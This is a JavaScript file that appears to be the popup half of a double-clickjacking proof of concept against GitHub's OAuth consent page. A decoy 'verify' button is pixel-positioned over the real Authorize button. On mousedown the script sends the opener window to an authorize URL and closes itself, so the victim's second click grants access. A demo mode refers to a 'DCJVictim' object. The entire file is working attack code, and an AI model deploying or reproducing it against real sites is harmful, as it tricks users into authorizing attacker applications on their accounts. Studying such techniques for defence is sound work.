(function () {
  const isReal = new URLSearchParams(location.search).has('real')
  const hasOpener = !!(window.opener && !window.opener.closed)

  // Pixel-tune against GitHub Authorize (use DevTools on the consent page)
  const REAL_POS = {
    top: '410px',
    left: 'calc(50% + 0px)',
    width: '220px',
    height: '32px',
    transform: 'none',
  }

  function applyRealPos() {
    const root = document.documentElement
    root.style.setProperty('--dcj-real-top', REAL_POS.top)
    root.style.setProperty('--dcj-real-left', REAL_POS.left)
    root.style.setProperty('--dcj-real-width', REAL_POS.width)
    root.style.setProperty('--dcj-real-height', REAL_POS.height)
    root.style.setProperty('--dcj-real-transform', REAL_POS.transform || 'none')
  }

  /** Preview / standalone: sit the button in the card slot while the card stays centered. */
  function anchorButtonToSlot() {
    const btn = document.getElementById('verify-btn')
    const slot = document.querySelector('.btn-slot')
    if (!btn || !slot) return

    const sync = () => {
      const r = slot.getBoundingClientRect()
      btn.style.top = `${r.top + r.height / 2}px`
      btn.style.left = `${r.left + r.width / 2}px`
      btn.style.transform = 'translate(-50%, -50%)'
      btn.style.width = `${Math.min(304, r.width)}px`
    }

    sync()
    window.addEventListener('resize', sync)
  }

  if (isReal) {
    document.body.classList.add('real-mode')
    if (hasOpener) {
      document.body.classList.add('dcj-live')
      applyRealPos()
    } else {
      requestAnimationFrame(anchorButtonToSlot)
    }
  } else if (!hasOpener) {
    requestAnimationFrame(anchorButtonToSlot)
  }

  document.getElementById('verify-btn').addEventListener('mousedown', () => {
    if (hasOpener && !window.opener.closed) {
      if (isReal && window.opener.DCJOAuth) {
        window.opener.location = window.DCJOAuth.buildAuthorizeUrl()
      } else if (!isReal && window.opener.DCJVictim) {
        window.opener.DCJVictim.revealOAuth()
      }
    }
    window.close()
  })
})()
